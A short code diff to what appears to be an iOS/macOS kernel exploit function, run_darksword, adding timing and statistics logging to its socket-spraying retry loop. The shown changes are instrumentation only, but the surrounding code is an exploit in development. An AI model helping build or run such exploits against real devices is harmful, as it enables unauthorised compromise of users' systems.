@@ -1315,6 +1315,9 @@ bool run_darksword(void) {
     NSMutableArray *usedGc = [NSMutableArray new];
 
     int attempt = 0;
+    mach_timebase_info_data_t timebase;
+    mach_timebase_info(&timebase);
+    uint64_t attemptStart = mach_absolute_time();
     while (1) {
         attempt++;
         printf("[exploit] attempt %d: spraying sockets...\n", attempt);
@@ -1368,7 +1371,13 @@ bool run_darksword(void) {
         }
 
         if (ok) break;
-        printf("[exploit] attempt %d: no socket found, retrying\n", attempt);
+        uint64_t now = mach_absolute_time();
+        double elapsed = (double)(now - attemptStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
+        printf("[exploit] attempt %d: no socket found, retrying (took %.1fs)\n", attempt, elapsed);
+        printf("[exploit]   stats: successReadCount=%d highestSuccessIdx=%d\n",
+            successReadCount, highestSuccessIdx);
+        fflush(stdout);
+        attemptStart = now;
     }
 
     printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
